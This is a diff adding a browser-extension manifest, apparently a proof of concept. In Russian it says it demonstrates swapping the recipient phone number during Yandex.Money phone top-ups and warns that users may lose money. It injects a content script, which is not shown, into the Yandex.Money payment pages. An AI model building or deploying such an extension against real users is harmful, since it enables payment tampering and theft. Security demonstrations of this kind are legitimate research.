@@ -1,0 +1,23 @@
+{
+  "name": "Демонстрация подмены данных в Яндекс.Деньгах",
+  "description": "Демонстрирует подмену телефона получателя при пополнении телефона Яндекс.Деньгами. Внимание, Вы можете потерять деньги!",
+  "version": "0.0.1",
+  "manifest_version": 2,
+  "icons": {
+	  "16": "16.png",
+      "48": "48.png",
+      "128": "128.png"
+  },
+  "permissions": [
+    "https://money.yandex.ru/*",
+    "https://sp-money.yandex.ru/*",
+	"storage"
+  ],
+  "content_scripts": [
+    {
+      "matches": ["https://money.yandex.ru/*", "https://sp-money.yandex.ru/*"],
+      "js": ["jquery.min.js","content.js"],
+      "run_at": "document_end"
+   }
+  ]
+}
